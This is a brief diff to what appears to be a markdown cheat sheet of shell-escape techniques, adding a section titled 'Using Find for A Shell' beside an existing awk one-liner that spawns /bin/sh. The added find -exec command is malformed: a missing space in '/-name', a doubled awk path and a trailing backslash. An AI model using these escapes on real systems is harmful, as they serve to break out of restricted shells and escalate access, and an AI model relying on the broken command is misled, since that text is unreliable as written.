@@ -40,4 +40,10 @@ awk 'BEGIN {system("/bin/sh")}'
 
 ---
 
+## Find 
 
+#### Using Find for A Shell
+```bash
+find /-name nameoffile -exec /bin/awk /bin/awk 'BEGIN {system("/bin/sh")}' \
+```
+-
